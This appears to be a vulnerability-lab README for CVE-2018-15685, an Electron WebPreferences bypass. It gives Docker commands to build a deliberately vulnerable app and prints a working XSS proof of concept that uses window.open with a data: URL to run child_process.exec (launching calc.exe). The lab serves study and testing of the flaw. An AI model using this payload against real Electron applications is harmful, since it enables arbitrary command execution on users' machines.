# Electron WebPreferences Remote Command Execution Vulnerability (CVE-2018-15685)

Electron is an open source library developed by Github to build cross-platform desktop applications using HTML, CSS and JavaScript. Electron does this by merging Chromium and Node.js into the same runtime environment and packaging it into applications for Mac, Windows and Linux.

When Electron sets `nodeIntegration=false` (default), the JavaScript in the page cannot access the built-in library of node.js. CVE-2018-15685 bypasses this limitation, enabling arbitrary commands to be executed if the user can execute JavaScript (such as when accessing a third-party page or an XSS vulnerability exists in the app).

Reference link:

- https://electronjs.org/blog/web-preferences-fix
- https://www.contrastsecurity.com/security-influencers/cve-2018-15685

## Compiling APP

Execute the following command to compile an application that contains a vulnerability:

```
Docker-compose run -e PLATFORM=win64 --rm electron
```

The value of PLATFORM is the operating system running the application. The options are: `win64`, `win32`, `mac`, `linux`.

After the compilation is complete, execute the following command to start the web service:

```
Docker-compose run --rm -p 8080:80 web
```

At this point, visit `http://your-ip:8080/cve-2018-15685.tar.gz` to download the compiled application.

## Recurring vulnerabilities

Open the app locally:

![](1.png)

Click Submit, the content in the input box will be displayed in the app, and there is obviously an XSS vulnerability.

We submit `<img src=1 onerror="require('child_process').exec('calc.exe')">` and find that there is no feedback, the reason is `nodeIntegration=false`.

At this point, submit the POC (Windows):

```
<img src=1 onerror="window.open().open('data:text/html,<script>require(\'child_process\').exec(\'calc.exe\')</script>' );">
```

Visible, calc.exe has been successfully popped up:

![](2.png)